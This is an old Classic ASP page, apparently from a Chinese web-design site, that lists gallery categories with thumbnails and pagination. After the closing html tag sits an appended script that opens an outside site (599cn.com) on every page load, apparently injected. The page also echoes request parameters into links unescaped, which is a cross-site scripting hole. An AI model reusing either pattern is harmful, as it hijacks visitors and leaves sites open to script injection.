<!--#include file="../inc/conn.asp" -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<meta name="title" content="Charles">
<META content="原古设计 网页制作 软件开发 网络推广 域名注册 domain domain domain domain homepage homepage homepage homepage web hosting web hosting web hosting" name=keywords>
<META content=原古设计,提供国际国内域名注册，包括中文域名的注册；虚拟主机，空间的租用，以及设计制作主页等服务 name=description>
<title><%= Web_Name %></title>
<link href="../css/css.css" rel="stylesheet" type="text/css">
<script>
<!--
function windowopen(vhtm){
newwindow=window.open(vhtm,"","fullscreen=1,toolbar=no, menubar=no, scrollbars=no, resizable=no,location=no, status=no");
}
//-->
</script>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
</style></head>

<body>
<table width="100%"  border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="504" valign="top" background="../images/index_1.jpg"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="74"><div align="right">
          <table width="986"  border="0" align="center" cellpadding="0" cellspacing="0">
            <tr>
              <td><div align="right"><img src="../images/index_2.jpg" width="216" height="69"></div></td>
            </tr>
          </table>
        </div></td>
      </tr>
      <tr>
        <td height="398" valign="top"><table width="986" background="../images/t_bg.jpg" align="center" border="0" cellspacing="0" cellpadding="0" height="398">
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td height="80"><img src="../images/ry1.jpg" width="302" height="43"></td>
          </tr>
          <tr>
            <td height="255" valign="top">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
                  <td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td><table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
                        <tbody>
<%
MaxPerPage=8
page=Request("page")
if (page="" or isempty(page)) then page=1
thisUrl="?Big_Class="&request("Big_Class")&"&ID="&request("ID")
Set Rs2=Server.CreateObject("adodb.recordset")
StrSql2="select * from P_Class Where ParentClassID=156 Order by Xu Asc"
Rs2.open StrSql2,conn,1,3
if not Rs2.eof then
num1=Rs2.recordcount
rs2.movefirst
if not isempty(request("page")) then   
pagecount=cint(request("page"))   
else   
pagecount=1   
end if
Rs2.pagesize=MaxPerPage
if pagecount>rs2.pagecount or pagecount<=0 then              
pagecount=1              
end if              
rs2.AbsolutePage=pagecount
end if
i=1
'if not (Rs2.eof or err) then Rs2.move (page-1)*maxPerPage
do while not Rs2.eof
if i mod 4=1 then Response.Write("<tr>")
%>
							<td align="middle"><table cellspacing="3" cellpadding="0" width="80%" align="center" border="0">
                                <tbody>
                                  <tr>
                                    <td width="2%" height="150"><div align="center">
<TABLE width="104" border=0 cellPadding=0 cellSpacing=0 style="border:2px solid #FFFFFF;">
<TR> 
<TD bgcolor="#000000"> 
<a href="#" onClick="windowopen('../photo/product_show.asp?Big_Class=<%= Rs2("ID") %>&Small_Class=<%= Rs2("ID") %>');"><img src="<%= Rs2("pic") %>" onload="javascript:if(this.height>=this.width){this.height=120;}else{this.width=120;}" border="0" /></a></td>
</tr>
</table></td>
                                  </tr>
                                  <tr>
                                    <td width="2%" height="5" align=center><a href="#" onClick="windowopen('../photo/product_show.asp?Big_Class=<%= rs2("ID") %>&Small_Class=<%= rs2("ID") %>');" style="color:#FFFFFF;  "><%= leftT(rs2("ClassName"),16) %></a></td>
                                  </tr>
                                </tbody>
                            </table></td>
<%
				Rs2.MoveNext
				if i mod 4=0 then Response.Write("</tr>")
				i=i+1
				if i>maxPerPage then exit do
				Loop
%> 
                        </tbody>
                      </table>
					  						<br>
                  <table width="100%" height="18" border="0" align="center" cellpadding="0" cellspacing="0" id="table7">
                    <tr>
                      <td height="18" align="center" valign="middle">
                        <%
              if request("page")="" then
              Lin_page=1
              else
              Lin_page=cint(request("page"))
              end if
			 if rs2.pagecount>1 then
			    response.Write "第"&pagecount&"页/共"&rs2.pagecount&"页&nbsp;&nbsp;"
			    if pagecount>=10 then
				   response.write"<a href="&thisUrl&"&page="&(((cstr(pagecount)\10)-1)*10)+1&"><<</a>&nbsp;&nbsp;"
			    end if
			    q=(cstr(pagecount)-1)\10
			    if q<0 then
			       q=1
			    end if
			    p=(q*10)+1
			    do while p<((q*10)+11)
			       If p=pagecount Then                        
				      Response.Write p&"&nbsp;&nbsp;"
			       Elseif p<=rs2.pagecount then
				      Response.Write "<a href='"&thisUrl&"&page="&p&"'>"& p &"</a>&nbsp;&nbsp;"
			       End If
			       p=p+1
		        loop
			    A=rs2.pagecount
			    if (A mod 10)=0 then
			        A=rs2.pagecount-1
			    end if
			    if pagecount<(A\10)*10 then
				   response.write"<a href="&thisUrl&"&page="&((((cstr(pagecount)-1)\10)+1)*10)+1&">>></a>"
			    end if
			    if Lin_page<=1 then
			     Response.Write ("首 页 " & vbCrLf)        

			     Response.Write ("上一页 " & vbCrLf)
			    else        
			     Response.Write("<A href="&thisUrl&"&page=1>首 页</A> " & vbCrLf)
			     Response.Write("<A href="&thisUrl&"&page=" & (Lin_page-1) & ">上一页</A> " & vbCrLf)
			    end if

			    if Lin_page>=rs2.pagecount then
			     Response.Write ("下一页 "& vbCrLf)
			     Response.Write ("尾 页 " & vbCrLf)            
			    else
			     Response.Write("<A href="&thisUrl&"&page=" & (Lin_page+1) & ">下一页</A> " & vbCrLf)
			     Response.Write("<A href="&thisUrl&"&page=" & rs2.pagecount & ">尾 页</A> " & vbCrLf)            
			    end if
			 End If%>                      </td>
                    </tr>
                  </table>
<% 
				Rs2.close
				set Rs2=nothing
 %>					  </td>
                    </tr>
                  </table></td>
                </tr>
              </table>
			</td>
          </tr>
          <tr>
            <td><img src="../images/menu.jpg" width="577" height="37" border="0" usemap="#Mapm"></td>
          </tr>
        </table></td>
  </tr>
</table>
</td>
      </tr>
      <tr>
        <td background="../images/index_5.jpg"><div align="center" style="z-index:-1;">
          <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="1002" height="73">
              <param name="movie" value="../images/lanm.swf">
              <param name="quality" value="high">
              <param name="wmode" value="transparent">
              <embed src="../images/lanm.swf" width="1002" height="73" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed>
          </object>
        </div></td>
      </tr>
      <tr>
        <td height="66" valign="top" background="../images/index_3.jpg"><div align="center"><img src="../images/333.jpg" width="945" height="66"></div></td>
      </tr>
    </table>
    <div align="center"></div></td>
  </tr>
</table>
<div style="z-index:1; position:absolute; left: 424px; top: 482px;"><a href="../photo/">作品展示</a>&nbsp;&nbsp;<a href="../lifu/">经典礼服</a></div>
<map name="Mapm">
<area shape="rect" coords="59,8,124,30" href="../tuandui/">
<area shape="rect" coords="172,9,239,30" href="../zunjue/">
<area shape="rect" coords="285,8,353,33" href="../rongyu/">
<area shape="rect" coords="396,7,459,32" href="../pinpai/">
<area shape="rect" coords="502,7,566,28" href="../zhuti/">
</map></body>
</html>
 
 <script language="javascript">
<!--
window.open ('http://www.599cn.com')
-->
</script>

 
 
 
 
 
 
 
 
 






